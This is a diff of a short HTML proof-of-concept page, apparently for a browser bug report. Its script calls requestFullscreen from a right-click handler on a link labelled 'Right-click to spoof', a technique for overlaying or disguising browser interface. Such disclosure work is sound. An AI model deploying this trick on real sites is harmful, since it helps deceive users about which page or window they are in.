@@ -1,26 +1,18 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>PoC Atlas Browser</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC</title>
 </head>
+
 <body>
+<a href="#" id="btn" style="margin-left: 400px;">Right-click to spoof</a>
+    <script>
 
-<center>
-<a id="link" href="https://permission.site">Right-click - Open Link in in the mini window</a>
-</center >
-
-<script>
-const link = document.getElementById('link');
-
-link.addEventListener('contextmenu', () => {
-  setTimeout(() => {
-document.body.requestFullscreen();
-  }, 500);
-});
-
-
-</script>
-
+        document.getElementById("btn").addEventListener("contextmenu", function() {
+            document.body.requestFullscreen(); // Request fullscreen on right-click
+        });
+    </script>
 </body>
 </html>
